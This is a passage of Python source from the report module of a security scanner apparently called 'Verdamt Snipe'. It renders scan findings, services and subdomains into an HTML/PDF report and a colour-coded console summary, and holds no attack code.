                <div style="padding:8px 0;">{tech_tags}</div>
            </div>

            <!-- Services Table -->
            <div class="panel" style="margin-top:20px;">
                <h3>Discovered Services ({len(self.services)})</h3>
                <div style="overflow-x:auto;">
                    <table class="findings-table">
                        <thead><tr><th>Port</th><th>Service</th><th>Status</th><th>Banner / Details</th></tr></thead>
                        <tbody>{services_rows}</tbody>
                    </table>
                </div>
            </div>

            <!-- Subdomains -->
            <div class="panel" style="margin-top:20px;">
                <h3>Enumerated Subdomains ({len(self.subs)})</h3>
                <div style="max-height:400px; overflow-y:auto; border:1px solid var(--border); border-radius:6px;">
                    {subs_html}
                </div>
            </div>
        </div>

        <!-- ═══════════ TAB 3: KILL CHAIN & PoC ═══════════ -->
        <div id="killchain" class="page{' active' if all_pages_active else ''}">
            <div class="section-header">
                <h2>⚔ Kill Chain & Proof of Concept</h2>
                <p>Detailed vulnerability findings with step-by-step proof of concepts, impact assessments, and reproduction instructions</p>
            </div>

            <!-- Filter Bar -->
            <div class="filter-bar">
                <button class="filter-btn" onclick="toggleFilter(this, 'Critical')">🔴 Critical ({counts["Critical"]})</button>
                <button class="filter-btn" onclick="toggleFilter(this, 'High')">🟠 High ({counts["High"]})</button>
                <button class="filter-btn" onclick="toggleFilter(this, 'Medium')">🟡 Medium ({counts["Medium"]})</button>
                <button class="filter-btn" onclick="toggleFilter(this, 'Low')">🟢 Low ({counts["Low"]})</button>
                <input type="text" id="findingSearch" class="search-input" placeholder="🔍 Search findings by title, URL, or type..." oninput="searchFindings(this.value)">
                <button class="filter-btn" onclick="expandAll()" title="Expand All" style="font-size:14px;">⊞</button>
                <button class="filter-btn" onclick="collapseAll()" title="Collapse All" style="font-size:14px;">⊟</button>
            </div>

            {cards_html}
        </div>

        <!-- ═══════════ TAB 4: RECOMMENDATIONS ═══════════ -->
        <div id="recommendations" class="page{' active' if all_pages_active else ''}">
            <div class="section-header">
                <h2>🛡 Remediation Recommendations</h2>
                <p>Aggregated remediation guidance sorted by risk priority, with framework-specific code fixes{' for ' + ', '.join(self.tech_stack) if self.tech_stack else ''}</p>
            </div>
            {rec_cards}
        </div>

    </div>

    <!-- ═══════════ FOOTER ═══════════ -->
    <div class="report-footer">
        <div style="margin-bottom:6px;">Generated by <strong>Verdamt Snipe</strong> v{self.version} • {html.escape(self.author)}</div>
        <div>Report ID: {self.report_id} • {scan_ts}</div>
        <div style="margin-top:8px; color:var(--crit); font-size:10px; letter-spacing:2px;">CONFIDENTIAL — FOR AUTHORIZED PERSONNEL ONLY</div>
    </div>

    <!-- Back to Top -->
    <button class="back-to-top" id="backToTop" onclick="scrollToTop()" title="Back to top">↑</button>

    {tab_js}
</body>
</html>"""

    def save_html(self):
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        safe = _sanitize_filename(self.target)
        fname = f"{OUTPUT_DIR}/{safe}_report.html"
        content = self._generate_html(for_pdf=False)
        with open(fname, "w", encoding="utf-8") as f:
            f.write(content)
        return fname

    def save_pdf(self) -> str:
        """Generate PDF using WeasyPrint."""
        if not WEASYPRINT_AVAILABLE:
            return ""

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        html_content = self._generate_html(for_pdf=True)

        # Write temp HTML for WeasyPrint
        safe = _sanitize_filename(self.target)
        tmp_html = os.path.join(OUTPUT_DIR, f"{safe}_report_tmp.html")
        pdf_path = f"{OUTPUT_DIR}/{safe}_report.pdf"

        try:
            with open(tmp_html, "w", encoding="utf-8") as f:
                f.write(html_content)
            WeasyHTML(filename=tmp_html).write_pdf(pdf_path)
        except Exception:
            return ""
        finally:
            if os.path.exists(tmp_html):
                os.remove(tmp_html)

        return pdf_path if os.path.exists(pdf_path) else ""

    def print_summary(self):
        from core.ui import console
        from rich.panel import Panel
        from rich.table import Table
        from rich.text import Text
        from rich.console import Group

        counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
        for f in self.findings:
            sev = finding_cvss(f)["v"]
            counts[sev] = counts.get(sev, 0) + 1

        crit_count = counts["Critical"]
        high_count = counts["High"]
        med_count = counts["Medium"]
        low_count = counts["Low"]
        info_count = counts["Info"]
        total_findings = len(self.findings)

        waf_str = ", ".join(self.waf_detected) if self.waf_detected else "None Detected"
        waf_style = "bold red" if self.waf_detected else "bold green"

        meta_table = Table.grid(padding=(0, 3))
        meta_table.add_column(style="bold cyan", justify="right")
        meta_table.add_column(style="white")
        meta_table.add_column(style="bold cyan", justify="right")
        meta_table.add_column(style="white")

        meta_table.add_row("Target Host:", self.target, "Duration:", f"{self.duration:.1f}s")
        meta_table.add_row("Report ID:", self.report_id, "Subdomains:", str(len(self.subs)))
        meta_table.add_row("Services:", str(len(self.services)), "Validated URLs:", str(len(self.urls)))
        meta_table.add_row("WAF Status:", f"[{waf_style}]{waf_str}[/]", "Total Findings:", f"[bold yellow]{total_findings}[/]")

        pills = (
            f"[bold white on red] CRITICAL: {crit_count} [/]  "
            f"[bold black on bright_red] HIGH: {high_count} [/]  "
            f"[bold black on yellow] MEDIUM: {med_count} [/]  "
            f"[bold black on green] LOW: {low_count} [/]  "
            f"[bold white on blue] INFO: {info_count} [/]"
        )

        header_group = [meta_table, Text(""), Text.from_markup(pills)]

        console.print()
        console.print(Panel(
            Group(*header_group),
            title="[bold green]MISSION EXECUTIVE SUMMARY[/bold green]",
            subtitle="[dim]Verdamt-Snipe Security Operations[/dim]",
            border_style="cyan",
            padding=(1, 2)
        ))

        if self.findings:
            table = Table(
                title="[bold red]CATEGORIZED VULNERABILITY FINDINGS[/bold red]",
                header_style="bold cyan on #1a1a24",
                border_style="dim white",
                show_header=True,
                expand=True
            )
            table.add_column("#", justify="center", style="dim white", width=4)
            table.add_column("SEV", justify="center", width=10)
            table.add_column("CVSS", justify="center", style="bold yellow", width=6)
            table.add_column("VULNERABILITY / TITLE", style="bold white")
            table.add_column("TARGET LOCATION / ENDPOINT", style="dim cyan")

            for idx, fd in enumerate(self.findings, 1):
                cv = finding_cvss(fd)
                sev = cv["v"]
                if sev == "Critical":
                    sev_fmt = "[bold white on red] CRIT [/]"
                elif sev == "High":
                    sev_fmt = "[bold black on bright_red] HIGH [/]"
                elif sev == "Medium":
                    sev_fmt = "[bold black on yellow] MED  [/]"
                elif sev == "Low":
                    sev_fmt = "[bold black on green] LOW  [/]"
                else:
                    sev_fmt = "[bold white on blue] INFO [/]"

                table.add_row(
                    str(idx),
                    sev_fmt,
                    f"{cv['s']:.1f}",
                    fd['title'],
                    fd.get('url', '')[:65]
                )
            console.print(table)
        else:
            console.print("\n  [bold green]✔[/bold green] [bold white]No security vulnerabilities detected by enabled modules.[/bold white]\n")

        safe = _sanitize_filename(self.target)
        html_path = f"{OUTPUT_DIR}/{safe}_report.html"
        pdf_path = f"{OUTPUT_DIR}/{safe}_report.pdf"

        rpt_lines = ["[bold white]ARTIFACTS & REPORTS GENERATED:[/bold white]"]
        if os.path.exists(html_path):
            rpt_lines.append(f"  [dim]├─►[/dim] [bold cyan]HTML Report:[/] {html_path}")
        else:
            rpt_lines.append(f"  [dim]├─►[/dim] [yellow][!] HTML report missing[/yellow]")

        if os.path.exists(pdf_path):
            rpt_lines.append(f"  [dim]└─►[/dim] [bold cyan]PDF Report:[/]  {pdf_path}")
        else:
            if not WEASYPRINT_AVAILABLE:
                rpt_lines.append(f"  [dim]└─►[/dim] [dim yellow][!] PDF report skipped (WeasyPrint library missing)[/dim yellow]")
            else:
                rpt_lines.append(f"  [dim]└─►[/dim] [yellow][!] PDF report rendering failed[/yellow]")

        console.print(Panel("\n".join(rpt_lines), border_style="dim cyan", padding=(0, 1)))
        console.print()


